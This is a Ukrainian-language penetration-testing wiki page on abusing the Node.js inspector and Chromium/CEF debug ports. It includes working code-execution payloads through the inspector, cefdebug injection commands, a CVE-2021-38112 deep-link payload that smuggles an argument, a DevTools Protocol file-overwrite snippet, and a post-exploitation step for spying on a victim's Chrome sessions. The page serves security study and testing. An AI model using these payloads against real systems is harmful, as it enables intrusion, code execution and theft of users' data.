# Зловживання Node inspector/CEF debug

Історичні практичні приклади включають walkthrough Multimaster і атаку на debugger Visual Studio Code через CVE-2019-1414; використовуйте їх як контекст, специфічний для певної версії, а не припускайте, що кожна актуальна ціль на Electron або Chromium надає ті самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): Якщо процес Node.js запущено з перемикачем `--inspect`, він очікує на клієнт для налагодження. **За замовчуванням** він прослуховує host і port **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Клієнти Inspector повинні знати й указати host address, port і UUID для підключення. Повна URL-адреса матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього порту, може отримати можливість виконувати довільний код від імені процесу Node.js (**потенційне підвищення привілеїв**).<sup>[[4]](#references)</sup>

Існує кілька способів запустити Inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, який інспектується, з’явиться щось подібне:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкривати debugger за допомогою `--remote-debugging-port=9222`. Це відкриває доступ до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через інспектор Node.js, тому payload'и на основі `process` Node.js за замовчуванням не застосовуються безпосередньо.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер із увімкненим налагодженням, з'явиться щось на кшталт цього:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у web-браузері, можуть надсилати WebSocket- і HTTP-запити відповідно до моделі безпеки браузера. **Початкове HTTP-з'єднання** необхідне для **отримання унікального ідентифікатора сесії debugger**. **Same-origin-policy** **не дозволяє** вебсайтам встановлювати **це HTTP-з'єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, щоб **заголовки 'Host'** для з'єднання точно містили або **IP-адресу**, або **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ці **заходи безпеки запобігають експлуатації inspector** для виконання коду **простим надсиланням HTTP-запиту** (що можна було б зробити шляхом експлуатації SSRF vuln).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Ви можете надіслати **сигнал SIGUSR1** запущеному nodejs-процесу, щоб змусити його **запустити inspector** на порту за замовчуванням. Однак зауважте, що потрібно мати достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не пряме підвищення привілеїв.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Це корисно в контейнерах, оскільки **зупинити процес і запустити новий** із `--inspect` **неможливо**, адже **container** буде **знищено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Щоб підключитися до браузера на базі **Chromium**, для Chrome або Edge відповідно можна відкрити URL `chrome://inspect` або `edge://inspect`. Натиснувши кнопку Configure, слід переконатися, що **цільовий host і port** правильно вказані. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після URL для доступу до debugger з'явиться. Наприклад, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Підключення до inspector/debugger: Щоб підключитися до браузера на базі Chromium,...](<../../images/image (674).png>)

За допомогою **command line** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити інспектори**, запущені локально, і **виконувати ін'єкцію коду** в них.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Зверніть увагу, що **NodeJS RCE exploits не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE у NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви перейшли сюди, шукаючи спосіб отримати [**RCE з XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Поширеним способом отримати **RCE**, коли ви можете **підключитися** до Node **inspector**, є використання чогось на кшталт цього (схоже, це **не працюватиме під час підключення до Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads протоколу Chrome DevTools

API можна переглянути тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я лише перелічу цікаві способи, які, як мені відомо, використовували для експлуатації цього протоколу.

### Ін’єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) компанія Rhino Security виявила, що застосунок на основі CEF **зареєстрував custom UR**I** у системі (workspaces://index.html), який отримував повний URI, а потім **запускав застосунок на основі CEF** з конфігурацією, частково сформованою з цього URI.<sup>[[8]](#references)</sup>

Було виявлено, що параметри URI декодувалися з URL і використовувалися для запуску базового застосунку CEF, що дозволяло користувачу **вставити** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні дії.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, де **завантажені файли будуть зберігатися**, і завантажте файл, щоб **перезаписати** часто використовуваний **вихідний код** застосунку своїм **шкідливим кодом**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE та exfiltration

STAR Labs показали, що відкриті сервіси WebDriver/CDP можуть уможливити довільне читання файлів і RCE; у деяких конфігураціях DNS rebinding може завершити ланцюжок експлуатації.<sup>[[9]](#references)</sup>

Для додаткових історичних випадків browser-automation і безпеки Chromium дивіться write-up Counter WebDriver та issues Project Zero 773, 1742 і 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

У реальному середовищі та **після компрометації** ПК користувача, на якому використовується browser на базі Chrome/Chromium, можна запустити процес Chrome з **активованим debugging і виконати port-forward debugging-порту**, щоб отримати до нього доступ. Таким чином ви зможете **переглядати все, що жертва робить у Chrome, і викрадати чутливу інформацію**.<sup>[[7]](#references)</sup>

Найбільш прихований спосіб — **завершити роботу кожного процесу Chrome**, а потім викликати щось на кшталт:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент для перевірки та експлуатації налагоджувача CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: віддалене виконання коду у Visual Studio Code через налагоджувач Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник з налагодження Node.js - початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Протокол Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: зловживання функцією налагодження Chrome для віддаленого спостереження за сеансами перегляду та керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Ти зі мною розмовляєш? - RCE у WebDriver через DNS Rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver - від бота до RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Проблема 773 Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Проблема 1742 Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Проблема 1944 Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
